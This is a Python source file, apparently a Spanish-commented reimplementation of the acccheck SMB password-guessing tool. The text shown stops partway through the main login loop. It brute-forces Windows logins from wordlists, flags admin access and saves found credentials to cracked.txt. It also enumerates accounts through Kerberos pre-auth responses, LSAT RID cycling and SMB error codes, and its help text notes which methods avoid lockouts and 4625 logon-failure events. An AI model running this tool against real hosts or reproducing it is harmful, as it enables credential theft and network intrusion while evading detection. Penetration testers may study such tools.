#!/usr/bin/env python3
"""
acccheck.py - Windows password guessing tool via SMB
Reimplementacion multiplataforma (Windows / macOS / Linux) de acccheck.pl.

A diferencia del original (que dependia del binario 'net use', solo-Windows),
esta version habla SMB directamente con impacket, por lo que corre igual en
cualquier SO y clasifica los errores por codigo NTSTATUS real.

Dependencias: se resuelven solas. Si falta 'impacket' el script lo instala
automaticamente con pip (con reintentos para PEP 668 / --user / ensurepip).

Windows moderno (10/11/Server 2016+): negociacion automatica SMB2/SMB3 con
NTLMv2, soporta SMB signing; correr con:  py -3 acccheck.py

Uso:
    python3 acccheck.py -t 10.10.10.1
    python3 acccheck.py -t 10.10.10.1 -p passwords.txt
    python3 acccheck.py -T targets.txt -U users.txt -P passwords.txt -v
    python3 acccheck.py -t 10.10.10.1 -u 'CORP\\administrador' -P rockyou.txt -d 1.5
    python3 acccheck.py -t 10.10.10.1 -u administrador -w CORP -P pass.txt

Autor: Reimplementacion basada en acccheck.pl v0.2.1 de Faisal Dean (Faiz)
"""

from __future__ import annotations

import argparse
import re
import socket
import subprocess
import sys
import tempfile
import time
import uuid
from pathlib import Path
from datetime import datetime

DEFAULT_PORT = 445
TIMEOUT = 10
PROGRESS_EVERY = 500

ADMIN_BUILTIN = {
    "en": ["Administrator"],
    "es": ["Administrador"],
    "fr": ["Administrateur"],
    "it": ["Amministratore"],
    "de": ["Administrator"],
    "pt": ["Administrador"],
    "nl": ["Administrator"],
    "ru": ["Администратор"],
}


def _resolve_default_admin(lang: str = "") -> list[str]:
    """
    Windows localiza el nombre de la cuenta built-in RID 500 segun el idioma
    del SO (Administrator / Administrador / Administrateur / ...). Sin usuario
    explicito se prueban primero los nombres del idioma indicado con --lang y
    despues el resto, todos deduplicados.
    """
    ordered: list[str] = []
    for code in ([lang.lower()] if lang.lower() in ADMIN_BUILTIN else []) + \
                [c for c in ADMIN_BUILTIN if c != lang.lower()]:
        for name in ADMIN_BUILTIN[code]:
            if name not in ordered:
                ordered.append(name)
    return ordered

STATUS = {
    0xC0000064: ("stop_user", "El usuario no existe"),
    0xC000006A: ("badcreds",  "Password incorrecto"),
    0xC000006D: ("badcreds",  "Usuario o password incorrectos"),
    0xC000006E: ("stop_user", "Restriccion de cuenta"),
    0xC000006F: ("stop_user", "Fuera del horario de logon permitido"),
    0xC0000070: ("stop_user", "Estacion de trabajo no permitida"),
    0xC0000071: ("stop_user", "Password expirado"),
    0xC0000072: ("stop_user", "Cuenta deshabilitada"),
    0xC000015B: ("stop_user", "Tipo de logon no permitido para este usuario"),
    0xC0000193: ("stop_user", "Cuenta expirada"),
    0xC0000224: ("stop_user", "El password debe cambiarse antes del logon"),
    0xC0000234: ("stop_user", "CUENTA BLOQUEADA (lockout)"),
}

_SMB_CLASSES = None


def _pip_install() -> None:
    """
    Instala impacket con pip en el interprete actual, degradando con elegancia:
      1. pip normal                          (Windows, venvs, macOS python.org)
      2. --user                              (sin permisos de escritura)
      3. --break-system-packages             (PEP 668: Kali/Debian/Ubuntu actuales)
      4. --user --break-system-packages      (PEP 668 sin root)
    Si pip no existe (python minimo), primero intenta bootstrap con ensurepip.
    """
    try:
        import pip
    except ImportError:
        try:
            subprocess.run(
                [sys.executable, "-m", "ensurepip", "--upgrade"],
                check=True, timeout=300,
            )
        except (subprocess.CalledProcessError, OSError, subprocess.TimeoutExpired) as e:
            print(f"[ERROR] pip no esta disponible y ensurepip fallo ({e}).", file=sys.stderr)
            sys.exit(1)

    base = [sys.executable, "-m", "pip", "install", "--no-input",
            "--quiet", "--disable-pip-version-check"]
    attempts = [
        base + ["impacket"],
        base + ["--user", "impacket"],
        base + ["--break-system-packages", "impacket"],
        base + ["--user", "--break-system-packages", "impacket"],
    ]
    last_err: Exception | None = None
    for cmd in attempts:
        try:
            subprocess.run(cmd, check=True, timeout=600)
            return
        except (subprocess.CalledProcessError, OSError, subprocess.TimeoutExpired) as e:
            last_err = e

    print(f"[ERROR] No se pudo instalar 'impacket' automaticamente ({last_err}).\n"
          f"        Instalalo manualmente con uno de:\n"
          f"          {sys.executable} -m pip install impacket\n"
          f"          {sys.executable} -m pip install --break-system-packages impacket\n"
          f"          {sys.executable} -m venv ~/acc && ~/acc/bin/pip install impacket"
          f" (Windows: py -3 -m venv acc && acc\\Scripts\\pip install impacket)",
          file=sys.stderr)
    sys.exit(1)


def _require_impacket():
    """
    Devuelve (SMBConnection, SessionError). Si 'impacket' no esta instalado,
    lo instala automaticamente con pip en el interprete actual y reintenta.
    Cachea el resultado para no repetir el trabajo en cada intento.
    """
    global _SMB_CLASSES
    if _SMB_CLASSES is not None:
        return _SMB_CLASSES

    try:
        from impacket.smbconnection import SMBConnection, SessionError
    except ImportError:
        print("[INFO] Falta 'impacket'. Instalando automaticamente con pip...", file=sys.stderr)
        _pip_install()

        try:
            from impacket.smbconnection import SMBConnection, SessionError
        except ImportError as e:
            print(f"[ERROR] Se instalo impacket pero el import sigue fallando: {e}", file=sys.stderr)
            sys.exit(1)

        print("[INFO] 'impacket' instalado correctamente.", file=sys.stderr)

    _SMB_CLASSES = (SMBConnection, SessionError)
    return _SMB_CLASSES


def smb_connect(ip: str, port: int, timeout: int):
    """Abre y negocia una conexion SMB contra 'ip'. Lanza excepcion si falla."""
    SMBConnection, _ = _require_impacket()
    return SMBConnection(remoteName=ip, remoteHost=ip, sess_port=port, timeout=timeout)


def smb_try_login(conn, user: str, password: str, domain: str) -> dict:
    """
    Intenta autenticar sobre una conexion SMB YA ABIERTA (se reusa entre
    intentos del mismo host: la negociacion SMB es cara, el login no).
    Devuelve dict:
      {'result': 'valid'|'badcreds'|'stop_user'|'conn_broken'|'other',
       'admin': bool, 'guest': bool, 'detail': str, 'code': int|None}
    'conn_broken' indica que la conexion subyacente murio (no que el
    password este mal) y hay que reconectar para seguir.
    'guest' avisa de sesion GUEST (Windows con acceso invitado): el login
    "funciona" con cualquier password y NO son credenciales reales.
    """
    _, SessionError = _require_impacket()

    try:
        conn.login(user, password, domain)
    except SessionError as e:
        code = e.getErrorCode()
        cat, desc = STATUS.get(code, ("other", _status_text(e, code)))
        return {"result": cat, "admin": False, "guest": False, "detail": desc, "code": code}
    except Exception as e:
        return {"result": "conn_broken", "admin": False, "guest": False,
                "detail": str(e), "code": None}

    guest = False
    try:
        guest = bool(conn.getSMBServer().isGuestSession())
    except Exception:
        pass

    is_admin = False
    try:
        tid = conn.connectTree("ADMIN$")
        is_admin = True
        try:
            conn.disconnectTree(tid)
        except Exception:
            pass
    except Exception:
        is_admin = False

    try:
        conn.logoff()
    except Exception:
        pass

    return {"result": "valid", "admin": is_admin, "guest": guest,
            "detail": "", "code": None}


def _status_text(session_error, code: int) -> str:
    try:
        name, desc = session_error.getErrorString()
        return f"{name}: {desc}"
    except Exception:
        return hex(code) if isinstance(code, int) else str(code)


def _safe_close(conn) -> None:
    if conn is None:
        return
    for method in ("logoff", "close"):
        try:
            getattr(conn, method)()
        except Exception:
            pass


def now() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def load_lines(path: str) -> list[str]:
    """Carga lineas de un archivo, ignorando vacias. Soporta BOM y bytes
    invalidos (wordlists reales como rockyou.txt NO son UTF-8 limpio)."""
    p = Path(path)
    if not p.exists():
        raise FileNotFoundError(f"File not found: {path}")
    text = p.read_text(encoding="utf-8-sig", errors="replace")
    return [ln.strip() for ln in text.splitlines() if ln.strip()]


def count_nonblank_lines(path: str) -> int:
    with Path(path).open("r", encoding="utf-8-sig", errors="replace") as f:
        return sum(1 for ln in f if ln.strip())


class PasswordSource:
    """
    Fuente de passwords reiterable. Si viene de archivo, NO lo carga entero
    en memoria (un wordlist tipo rockyou.txt son ~14M lineas): se relee del
    disco en cada pasada, manteniendo el uso de memoria en O(1).
    """

    def __init__(self, fixed: list[str] | None = None, file_path: str | None = None):
        self._fixed = fixed
        self._file_path = file_path
        if fixed is not None:
            self._length = len(fixed)
        else:
            if not Path(file_path).exists():
                raise FileNotFoundError(f"File not found: {file_path}")
            self._length = count_nonblank_lines(file_path)

    def __len__(self) -> int:
        return self._length

    def __iter__(self):
        if self._fixed is not None:
            yield from self._fixed
            return
        with Path(self._file_path).open("r", encoding="utf-8-sig", errors="replace") as f:
            for line in f:
                line = line.strip()
                if line:
                    yield line


def split_domain(user: str, domain: str) -> tuple[str, str]:
    """Permite pasar el usuario como CORP\\user o CORP/user; -w tiene prioridad."""
    if domain:
        return user, domain
    for sep in ("\\", "/"):
        if sep in user:
            dom, _, usr = user.partition(sep)
            return usr, dom
    return user, ""


def _harden_streams() -> None:
    """Windows: la consola/redireccion usa cp1252/cp850; sin esto, imprimir
    un password con caracteres no mapeables revienta con UnicodeEncodeError."""
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(errors="replace")
        except Exception:
            pass


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="acccheck.py - Windows/SMB password guessing tool (multiplataforma, impacket)",
        epilog="Ejemplos:\n"
               "  python3 acccheck.py -t 10.10.10.1\n"
               "  python3 acccheck.py -t 10.10.10.1 -p passwords.txt\n"
               "  python3 acccheck.py -T targets.txt -U users.txt -P passwords.txt -v -d 1\n"
               "  python3 acccheck.py -t 10.10.10.1 -u CORP\\\\administrador -P rockyou.txt\n",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("-t", "--target", help="Single target IP address")
    target_group.add_argument("-T", "--target-file", help="File containing list of target IPs")

    user_group = parser.add_mutually_exclusive_group()
    user_group.add_argument("-u", "--user", help="Single username (default: Administrator)")
    user_group.add_argument("-U", "--user-file", help="File containing list of usernames")

    pass_group = parser.add_mutually_exclusive_group()
    pass_group.add_argument("-p", "--password", help="Single password (default: blank)")
    pass_group.add_argument("-P", "--password-file", help="File containing list of passwords")

    parser.add_argument("-w", "--domain", default="",
                        help="Dominio (AD). Tambien podes usar CORP\\usuario en -u")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT,
                        help=f"Puerto SMB (default {DEFAULT_PORT}; usa 139 en hosts legacy)")
    parser.add_argument("--timeout", type=int, default=TIMEOUT,
                        help=f"Timeout por intento en segundos (default {TIMEOUT})")
    parser.add_argument("-d", "--delay", type=float, default=0.0,
                        help="Delay en segundos entre intentos (anti-lockout, ej. 1.5)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument(
        "--lang", default="auto",
        help="Idioma del OS objetivo para resolver el admin built-in (en|es|fr|it|de|pt; auto detecta)",
    )
    parser.add_argument(
        "--enum", nargs="*", choices=("kerb", "samr", "smb", "all"), default=None,
        metavar="MODO",
        help="Modo enumeracion de usuarios. Sin argumento se ejecutan todos en orden "
             "de menor a mayor intrusion. Modos disponibles:\n"
             "  kerb  Kerberos pre-auth (AS-REP contra puerto 88). NO requiere credenciales, "
             "NO genera 4625, no causa lockout. Solo funciona contra DC.\n"
             "  samr  MS-LSAT over SMB \\\\PIPE\\lsarpc (LookupSids). REQUIERE credenciales "
             "validas (-u/-p). Definitivo contra cualquier Windows, miembro o DC, "
             "sin generar 4625 (autenticado, no probea password).\n"
             "  smb   Oraculo NTSTATUS en SMB (SessionSetup). REQUIERE credenciales (-p). "
             "Genera 4625 por cada probe, ambiguo en hosts con UAC/built-ins restringidos.\n"
             "  all   Equivale a kerb+samr+smb en orden.\n"
             "Si un modo ya resuelve los usuarios de forma conclusiva, los siguientes se "
             "omiten. Resultados a enum_<ip>.txt. Ej: --enum samr",
    )
    parser.add_argument(
        "--kerb-domain", default="",
        help="Dominio DNS a usar con --enum kerb (ej: corp.local). Si no se indica, "
             "se intenta detectar del banner Kerberos (AS-REP).",
    )
    parser.add_argument(
        "--max-rid", type=int, default=4000,
        help="RID maximo a enumerar con --enum samr (default 4000). Un Windows stock "
             "tiene usuarios reales por debajo de RID 2000; DCs con muchos usuarios "
             "pueden requerir 5000+.",
    )
    parser.add_argument(
        "--no-interactive", action="store_true",
        help="No pausar entre modos de enumeracion para mostrar resultados parciales.",
    )
    parser.add_argument(
        "--debug", action="store_true",
        help="Mostrar traceback completo ante cualquier error (uso para depurar).",
    )

    return parser.parse_args()


def _ntstatus_for(conn, user: str, password: str, domain: str) -> tuple[str, int | None]:
    """Hace un login descartable y devuelve (categoria, codigo_ntstatus).
    Usado por el modo --enum para distinguir existe/inexistente sin
    depender de la semántica fija del target."""
    _, SessionError = _require_impacket()
    try:
        conn.login(user, password, domain)
        return ("valid", None)
    except SessionError as e:
        return ("session_error", e.getErrorCode())
    except Exception:
        return ("conn_broken", None)


def _calibrate_ghost(conn, domain: str) -> int | None:
    """Devuelve el NTSTATUS que devuelve este target para un usuario
    inexistente aleatorio. Necesario porque el comportamiento por SO/policy
    varia: algunos devuelven 0xC0000064 (NO_SUCH_USER), otros 0xC000015B
    (restriccion), otros 0xC000006D (creds invalidas - no se puede
    distinguir de usuario existente)."""
    ghost = f"accenum_{uuid.uuid4().hex[:12]}"
    cat, code = _ntstatus_for(conn, ghost, "x", domain)
    return code


def _enumerate_users(conn, users: list[str], domain: str, ghost_code: int | None,
                      probe_password: str) -> tuple[list[str], list[str], list[str]]:
    """Para cada usuario abre un login y clasifica:
      EXISTS        si NTSTATUS != ghost_code (firma distinta a fantasma)
      INDETERMINATE si NTSTATUS == ghost_code (misma firma que fantasma:
                    no se puede distinguir entre cuenta inexistente y
                    cuenta con logon de red denegado por policy, p.ej.
                    built-in Administrator/Invitado con UAC remote block).
      NOEXIST       si la categoria es session_error y code != ghost_code
                    por seguridad conservativa (no es firma fantasma).
    Devuelve (existentes, indeterminados, noexistentes).
    """
    exists, indeterminate, missing = [], [], []
    for u in users:
        cat, code = _ntstatus_for(conn, u, probe_password, domain)
        if cat == "valid":
            exists.append(u)
            continue
        if cat == "conn_broken":
            indeterminate.append(u)
            continue
        if code != ghost_code:
            exists.append(u)
        else:
            indeterminate.append(u)
    return exists, indeterminate, missing


def _kerb_hash_lookup(ip: str, user: str, domain: str) -> tuple[str, str]:
    """
    Oraculo Kerberos: AS-REQ sin pre-auth contra el KDC (88/TCP).
    El DC responde distinto si el principal existe o no:
      KDC_ERR_PREAUTH_REQUIRED    -> existe (pidio pre-auth, lo normal)
      KDC_ERR_C_PRINCIPAL_UNKNOWN -> no existe
      KDC_ERR_CLIENT_REVOKED/KEY_EXPIRED -> existe pero deshabilitada/expirada
    No envia password ni genera 4625: es la via menos intrusiva.
    Devuelve (status, detalle) con status en ok|noexist|blocked|error.
    """
    from impacket.krb5.kerberosv5 import getKerberosTGT
    from impacket.krb5.types import Principal
    from impacket.krb5 import constants
    try:
        principal = Principal(user, type=constants.PRINCIPAL_NT_PRINCIPAL)
        getKerberosTGT(principal, "", domain, "", "", "", kdcHost=ip)
        return ("ok", "TGT sin pre-auth (AS-REP roasteable si soporta RC4)")
    except Exception as e:
        msg = str(e)
        if "KDC_ERR_PREAUTH_REQUIRED" in msg:
            return ("ok", "existe (exige pre-auth, cuenta normal)")
        if "KDC_ERR_CLIENT_REVOKED" in msg or "KDC_ERR_KEY_EXPIRED" in msg:
            return ("ok", "existe pero deshabilitada o expirada")
        if "KDC_ERR_C_PRINCIPAL_UNKNOWN" in msg:
            return ("noexist", msg)
        if "KDC_ERR_WRONG_REALM" in msg or "KDC_ERR_DOMAIN" in msg:
            return ("error", f"realm incorrecto '{domain}': ajusta --kerb-domain o -w")
        if "Connection" in msg or "timed out" in msg.lower() or "refused" in msg.lower():
            return ("blocked", msg)
        return ("error", msg)


def _kerb_enumerate(ip: str, domain: str, users: list[str]) -> dict[str, list[str]]:
    """Ejecuta _kerb_hash_lookup para cada usuario. Aborta (status 'blocked'
    del metodo completo) si el primer usuario da error de red: no hay KDC."""
    results = {"exists": [], "exists_restricted": [], "noexist": [], "error": []}
    probe = f"acccheck_{uuid.uuid4().hex[:8]}"
    status, _ = _kerb_hash_lookup(ip, probe, domain)
    if status == "blocked":
        results["error"].append(f"[METODO-BLOQUEADO] sin KDC alcanzable en 88/tcp: {ip}")
        return results
    for u in users:
        status, detail = _kerb_hash_lookup(ip, u, domain)
        if status == "ok":
            if "deshabilitada" in detail or "expirada" in detail:
                results["exists_restricted"].append(u)
            else:
                results["exists"].append(u)
        elif status == "noexist":
            results["noexist"].append(u)
        else:
            results["error"].append(f"{u}: {detail}")
        time.sleep(0.2)
    return results


def _lsarpc_enum_users(ip: str, port: int, timeout: int,
                       user: str, password: str, domain: str,
                       max_rid: int) -> list[tuple[int, str]]:
    """
    Enumeracion MS-LSAT (lookupsid) sobre \\PIPE\\lsarpc con credenciales validas.
    Es la misma via que impacket-lookupsid: hLsarOpenPolicy2 -> PolicyAccountDomainInfo
    (SID de la cuenta local o del dominio) -> hLsarLookupSids en lotes de 1000.
    Devuelve [(rid, nombre)] de las cuentas tipo USER. Funciona igual en
    Windows workstation, server y DC, en cualquier idioma (los nombres
    devueltos son los reales del SAM/AD, nunca traducidos).
    """
    from impacket.dcerpc.v5 import transport, lsat, lsad
    from impacket.dcerpc.v5.samr import SID_NAME_USE
    from impacket.dcerpc.v5.dtypes import MAXIMUM_ALLOWED
    from impacket.dcerpc.v5.rpcrt import DCERPCException

    rpctransport = transport.DCERPCTransportFactory(f"ncacn_np:{ip}[\\pipe\\lsarpc]")
    rpctransport.set_dport(port)
    rpctransport.setRemoteHost(ip)
    if hasattr(rpctransport, "set_credentials"):
        rpctransport.set_credentials(user, password, domain, "", "")
    if hasattr(rpctransport, "set_timeout"):
        rpctransport.set_timeout(timeout)

    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(lsat.MSRPC_UUID_LSAT)
    resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | lsat.POLICY_LOOKUP_NAMES)
    policy_handle = resp["PolicyHandle"]
    resp = lsad.hLsarQueryInformationPolicy2(
        dce, policy_handle, lsad.POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
    domain_sid = resp["PolicyInformation"]["PolicyAccountDomainInfo"]["DomainSid"].formatCanonical()

    found: list[tuple[int, str]] = []
    so_far = 1
    BATCH = 1000
    while so_far <= max_rid:
        batch = min(BATCH, max_rid - so_far + 1)
        sids = [f"{domain_sid}-{i}" for i in range(so_far, so_far + batch)]
        try:
            lsat.hLsarLookupSids(dce, policy_handle, sids,
                                 lsat.LSAP_LOOKUP_LEVEL.LsapLookupWksta)
            so_far += batch
            continue
        except DCERPCException as e:
            msg = str(e)
            if "STATUS_NONE_MAPPED" in msg:
                so_far += batch
                continue
            if "STATUS_SOME_NOT_MAPPED" in msg:
                resp = e.get_packet()
            else:
                raise
        for n, item in enumerate(resp["TranslatedNames"]["Names"]):
            if item["Use"] != SID_NAME_USE.SidTypeUnknown:
                rid = so_far + n
                name = item["Name"]
                if item["Use"] == SID_NAME_USE.SidTypeUser:
                    found.append((rid, name))
        so_far += batch
    return found


ENUM_METHOD_ORDER = ["kerb", "samr", "smb"]

ENUM_METHOD_INFO = {
    "kerb": ("Kerberos pre-auth (UDP/TCP 88)", False,
             "contra el DC del dominio; no requiere credenciales, "
             "no genera eventos 4625 ni lockouts; no funciona en workstations"),
    "samr": ("MS-LSAT LookupSids (TCP 445 \\\\PIPE\\lsarpc)", True,
             "requiere credenciales validas (-u/-p); es el metodo definitivo, "
             "enumera todos los usuarios reales del SAM/AD en cualquier idioma "
             "de Windows; no genera 4625 (no prueba passwords)"),
    "smb":  ("Oraculo NTSTATUS SMB (TCP 445)", True,
             "requiere password senuelo (-p); genera 4625 por cada probe "
             "y es ambiguo en cuentas built-in con logon de red denegado"),
}

ENUM_AUTH_TXT = {
    "kerb": "no requiere credenciales",
    "samr": "requiere credenciales validas: -u USUARIO -p PASSWORD",
    "smb":  "requiere password senuelo: -p SENUELO (ej: -p 'Imposible!123')",
}


def _port_open(ip: str, port: int, timeout: float = 4.0) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except OSError:
        return False


def _write_enum_results(ip: str, results: dict[str, list[tuple[str, str]]]) -> None:
    """Escribe enum_<ip>.txt con formato MODE:STATUS:USER y reporta por consola."""
    lines: list[str] = []
    for method, entries in results.items():
        for status, user in entries:
            lines.append(f"{method}:{status}:{user}")
            print(f"  [{method}:{status}] {user}")
    out = Path(f"enum_{ip}.txt")
    out.write_text("\n".join(lines) + ("\n" if lines else ""), encoding="utf-8")
    print(f"  -> resultados en {out.absolute()}")


def _run_enumeration(args, targets: list[str], users: list[str]) -> None:
    """
    Orquestador de --enum. Estrategia menos-intrusivo-primero:
      kerb -> samr -> smb. En cuanto un metodo produce resultados
      conclusivos (al menos un EXISTS), los siguientes se omiten para no
      pagar ruido innecesario. Si todos los metodos disponibles se quedan
      sin salida, se avisa claramente.

    Precondiciones verificadas ANTES de tocar el target:
      kerb: 88/tcp alcanzable (sino se omite con 'no hay KDC')
      samr: -u/-p con credenciales VALIDAS (si no, se omite explicando por que)
      smb:  -p con password senuelo no vacio (si no, se omite explicando por que)

    Multi-target: repite el plan por cada IP; resultados a enum_<ip>.txt.
    Compatibilidad Windows: kerb y samr/smb hablan protocolos nativos de
    Windows (MS-Kerberos, MS-LSAT, NTLM/SMB) que son identicos en cualquier
    idioma de SO; los nombres devueltos por samr son los reales del SAM/AD.
    """
    requested = args.enum if args.enum else ["all"]
    if "all" in requested:
        plan = list(ENUM_METHOD_ORDER)
    else:
        plan = [m for m in ENUM_METHOD_ORDER if m in requested]
        unknown = [m for m in requested if m not in ENUM_METHOD_ORDER]
        if unknown:
            print(f"[ERROR] modos desconocidos: {unknown}. Validos: kerb|samr|smb|all",
                  file=sys.stderr)
            sys.exit(2)

    print("[ENUM] plan de enumeracion (menos intrusivo primero):")
    for i, m in enumerate(plan, 1):
        desc, needs_auth, nota = ENUM_METHOD_INFO[m]
        print(f"  {i}. {m:<5} - {desc}")
        print(f"        auth: {ENUM_AUTH_TXT[m]}")
        print(f"        nota: {nota}")

    if "samr" in plan and not (args.user and args.password):
        if len(plan) == 1:
            print("[ERROR] --enum samr requiere credenciales validas: -u USUARIO -p PASSWORD",
                  file=sys.stderr)
            sys.exit(2)
        print("  [INFO] samr omitido del plan: no se proporcionaron credenciales (-u y -p).")
        plan.remove("samr")
    if "smb" in plan and not args.password:
        if len(plan) == 1:
            print("[ERROR] --enum smb requiere -p con un password senuelo no vacio "
                  "(ej: -p 'Imposible!123')", file=sys.stderr)
            sys.exit(2)
        print("  [INFO] smb omitido del plan: no se proporciono password senuelo (-p).")
        plan.remove("smb")
    if not plan:
        print("[ERROR] ningun metodo de enumeracion aplicable con los argumentos dados.\n"
              "        Sugerencias:\n"
              "          - con credenciales validas:   --enum samr -u USER -p PASS\n"
              "          - con password senuelo:       --enum smb -p 'Imposible!123'\n"
              "          - contra un DC de dominio:    --enum kerb -w dominio.local",
              file=sys.stderr)
        sys.exit(2)

    for ip in targets:
        print(f"\n[ENUM] {ip}")
        results: dict[str, list[tuple[str, str]]] = {}
        conclusive = False

        for method in plan:
            if conclusive:
                print(f"  [SKIP {method}] ya tenemos resultados concluyentes; "
                      f"no pagamos mas intrusion.")
                continue

            if method == "kerb":
                print("  [kerb] comprobando si hay un DC accesible (puerto 88/tcp)...")
                if not _port_open(ip, 88):
                    print("  [kerb] -> 88/tcp cerrado: este host no es un DC o Kerberos "
                          "no esta expuesto. Probando siguiente metodo.")
                    continue
                domain = args.kerb_domain or args.domain
                if not domain:
                    print("  [kerb] -> falta el dominio/realm. Indicalo con --kerb-domain "
                          "DOMINIO o -w DOMINIO (ej: -w corp.local).")
                    continue
                print(f"  [kerb] KDC detectado. Enviando AS-REQ sin pre-auth contra "
                      f"{domain} (este metodo no requiere password, no genera 4625)...")
                try:
                    r = _kerb_enumerate(ip, domain, users)
                except Exception as e:
                    print(f"  [kerb] ERROR: {e}")
                    continue
                for u in r["exists"]:
                    results.setdefault("kerb", []).append(("EXISTS", u))
                for u in r["exists_restricted"]:
                    results.setdefault("kerb", []).append(("EXISTS-DESHAB", u))
                for u in r["noexist"]:
                    results.setdefault("kerb", []).append(("NOEXIST", u))
                for e in r["error"]:
                    results.setdefault("kerb", []).append(("ERROR", e))
                if r["exists"] or r["exists_restricted"]:
                    conclusive = True

            elif method == "samr":
                user, domain = split_domain(args.user, args.domain)
                print(f"  [samr] autenticado como {domain or '<sin dominio>'}\\{user}, "
                      f"consultando cuentas del SAM via \\PIPE\\lsarpc "
                      f"(RIDs 1..{args.max_rid}, en lotes de 1000)...")
                try:
                    entries = _lsarpc_enum_users(ip, args.port, args.timeout,
                                                 user, args.password, domain,
                                                 args.max_rid)
                except Exception as e:
                    print(f"  [samr] ERROR (credenciales validas? acceso a lsarpc? "
                          f"anti-virus bloqueando?): {e}")
                    continue
                for rid, name in entries:
                    results.setdefault("samr", []).append(("EXISTS", f"{name} (RID {rid})"))
                if entries:
                    conclusive = True

            elif method == "smb":
                probe_password = args.password
                print(f"  [smb] calibrando firma fantasma con un usuario aleatorio y "
                      f"probando cada candidato con password senuelo '{probe_password}'...")
                print(f"  [smb] AVISO: cada intento genera un evento 4625 en el DC/host. "
                      f"Con delay -d 1.5 reduce el riesgo de lockout.")
                try:
                    conn = smb_connect(ip, args.port, args.timeout)
                except Exception as e:
                    print(f"  [smb] ERROR: {e}")
                    continue
                try:
                    ghost = _calibrate_ghost(conn, args.domain)
                    if ghost is None:
                        print("  [smb] no se pudo calibrar la firma fantasma del target")
                        continue
                    print(f"  [smb] firma fantasma (usuario inexistente): {hex(ghost)}. "
                          f"Cualquier respuesta distinta == EXISTE.")
                    exists, indeterminate, missing = _enumerate_users(
                        conn, users, args.domain, ghost, probe_password)
                finally:
                    _safe_close(conn)
                for u in exists:
                    results.setdefault("smb", []).append(("EXISTS", u))
                for u in indeterminate:
                    results.setdefault("smb", []).append(("INDET", u))
                for u in missing:
                    results.setdefault("smb", []).append(("NOEXIST", u))
                if exists:
                    conclusive = True

        if not results:
            print("  sin resultados: ningun metodo aplicable/exitoso. Revisa el plan impreso.")
        _write_enum_results(ip, results)


def _validate_files(args) -> None:
    """
    Fail-fast: verifica ANTES de cualquier actividad de red que los archivos
    indicados existan, sean archivos regulares y sean legibles. Sin esto, un
    typo en la ruta explota con traceback a mitad del scan.
    """
    checks = [("-T/--target-file", args.target_file),
              ("-U/--user-file", args.user_file),
              ("-P/--password-file", args.password_file)]
    for flag, path in checks:
        if not path:
            continue
        p = Path(path)
        if not p.exists():
            print(f"[ERROR] {flag}: el archivo no existe: '{path}'\n"
                  f"        Ruta actual: {Path.cwd()}\n"
                  f"        Revisa el nombre o la ruta y vuelve a intentarlo.",
                  file=sys.stderr)
            sys.exit(1)
        if not p.is_file():
            print(f"[ERROR] {flag}: '{path}' existe pero no es un archivo regular.",
                  file=sys.stderr)
            sys.exit(1)
        try:
            with p.open("rb"):
                pass
        except PermissionError:
            print(f"[ERROR] {flag}: sin permisos de lectura sobre '{path}'.",
                  file=sys.stderr)
            sys.exit(1)


def _run(args) -> None:
    _require_impacket()

    targets = [args.target] if args.target else load_lines(args.target_file)

    if args.user:
        users = [args.user]
    elif args.user_file:
        users = load_lines(args.user_file)
    else:
        users = _resolve_default_admin(getattr(args, 'lang', ''))

    if args.password:
        passwords = PasswordSource(fixed=[args.password])
    elif args.password_file:
        passwords = PasswordSource(file_path=args.password_file)
    else:
        passwords = PasswordSource(fixed=[""])

    cracked_file = Path("cracked.txt")
    try:
        cracked_file.touch(exist_ok=True)
    except OSError:
        cracked_file = Path(tempfile.gettempdir()) / "acccheck_cracked.txt"
        print(f"[INFO] Directorio actual no escribible; resultados en: {cracked_file}",
              file=sys.stderr)

    print(f"acccheck.py - Starting scan at {now()}")
    print(f"Targets: {len(targets)}, Users: {len(users)}, Passwords: {len(passwords)}")
    print("-" * 60)

    if args.enum is not None:
        _run_enumeration(args, targets, users)
        return

    total_attempts = 0
    success_count = 0
    unreachable: set[str] = set()

    try:
        for ip in targets:
            if ip in unreachable:
                continue

            conn = None
            host_dead = False

            for raw_user in users:
                if host_dead:
                    break
                user, domain = split_domain(raw_user, args.domain)

                for password in passwords:
                    total_attempts += 1

                    if args.verbose:
                        dom = f"{domain}\\" if domain else ""
                        print(f"Host:{ip}, Username:'{dom}{user}', Password:'{password}'")
                    elif total_attempts % PROGRESS_EVERY == 0:
                        print(f"[...] {total_attempts} intentos realizados "
                              f"(host actual: {ip}, user actual: {user})")

                    if conn is None:
                        try:
                            conn = smb_connect(ip, args.port, args.timeout)
                        except Exception as e:
                            print(f"[SKIP] {ip} inalcanzable ({e}) - se omite el host")
                            unreachable.add(ip)
                            host_dead = True
                            break

                    res = smb_try_login(conn, user, password, domain)
                    result = res["result"]

                    if result == "conn_broken":
                        _safe_close(conn)
                        try:
                            conn = smb_connect(ip, args.port, args.timeout)
                        except Exception as e:
                            print(f"[SKIP] {ip} inalcanzable ({e}) - se omite el host")
                            unreachable.add(ip)
                            host_dead = True
                            break
                        res = smb_try_login(conn, user, password, domain)
                        result = res["result"]
                        if result == "conn_broken":
                            print(f"[SKIP] {ip} inalcanzable ({res['detail']}) - se omite el host")
                            _safe_close(conn)
                            conn = None
                            unreachable.add(ip)
                            host_dead = True
                            break

                    if result == "valid":
                        tag = " (admin)" if res["admin"] else ""
                        if res["guest"]:
                            tag += " [GUEST - probable falso positivo]"
                        dom = f"{domain}\\" if domain else ""
                        msg = (f"SUCCESS.... connected to {ip} with "
                               f"username:'{dom}{user}' and password:'{password}'{tag}")
                        print(msg)
                        with cracked_file.open("a", encoding="utf-8") as f:
                            f.write(msg + "\n")
                        success_count += 1
                        conn = None
                        break

                    if result == "stop_user":
                        print(f"[STOP] {ip} user:'{user}' -> {res['detail']} "
                              f"- no se prueban mas passwords para este usuario")
                        break

                    if args.verbose and result == "other":
